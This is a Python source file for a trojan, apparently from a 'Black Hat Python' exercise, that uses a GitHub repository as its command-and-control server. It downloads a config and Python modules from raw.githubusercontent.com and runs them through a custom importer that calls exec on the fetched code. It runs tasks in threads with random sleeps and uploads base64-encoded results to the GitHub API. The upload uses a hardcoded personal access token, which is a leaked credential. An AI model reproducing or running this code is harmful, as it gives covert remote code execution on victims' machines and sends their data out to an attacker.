import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
import requests

trojan_id = 'test'

trojan_config = 'config/{}.json'.format(trojan_id)
data_path = "data/{}".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

def get_file_contents(path):
    try:
        url = 'https://raw.githubusercontent.com/nanioo/bhp/master/'+path
        re = requests.get(url)
        print("[+] Read {} file success!".format(path))
        return re.text
    except:
        print('[-] Read {} file fail!'.format(path))
    return

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    print(config_json)
    config= json.loads(config_json)

    for task in config:
        if task['module'] not in sys.modules:
            configured = True
            exec("import {}".format(task['module']))
    return config

def store_module_result(msg):
    url = 'https://api.github.com/repos/nanioo/bhp/contents/{}_{}.data'.format(data_path,random.randint(1000,100000))
    data = {
        "message": "commit from null",
        "content": str(base64.b64encode(msg.encode("utf-8")))[2:-1]
    }
    head = {
       'Authorization': 'token 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'
    }
    data=json.dumps(data)
    re = requests.put(url,headers=head,data=data)
    return

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''
    
    def find_module(self,fullname,path=None):
        global configured
        if configured:
            configured =False
            print("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}.py".format(fullname))
            
            if new_library is not None:
                self.current_module_code = new_library
                return self
        return None

    def load_module(self,name):
        module = imp.new_module(name)
        exec(self.current_module_code,module.__dict__)
        sys.modules[name] = module
        return module

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return

def main():
    sys.meta_path = [GitImporter()]
    while True:
        if task_queue.empty():
            config = get_trojan_config()
            for task in config:
                t = threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))
        time.sleep(random.randint(1000,10000))

main()
